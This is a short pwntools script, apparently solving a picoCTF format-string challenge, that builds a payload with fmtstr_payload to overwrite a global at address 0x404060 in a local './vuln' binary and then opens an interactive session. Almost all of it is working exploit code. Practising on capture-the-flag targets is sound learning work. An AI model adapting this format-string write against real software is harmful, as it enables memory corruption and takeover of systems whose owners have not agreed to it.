from pwn import *

context.binary = './vuln'
p = process("./vuln")
#p = remote("rhea.picoctf.net", 58703)

#res = p.recvline().decode()
#print(res)
# log.success(flag)

#target = elf.sym.sus
target = int('404060', 16)
value = int('67616c66', 16)
offset = 14
address = {target: value}

#payload = fmtstr_payload(offset, {target: 0x21737573})

payload = fmtstr_payload(offset, address, write_size='byte')

#p.recvuntil(b"say?")
#p.sendlineafter(b"say?\n", payload)
print(payload)
#p.sendlineafter(b"say?", payload)
p.sendline(payload)
#print(p.recvall().decode())

p.interactive()
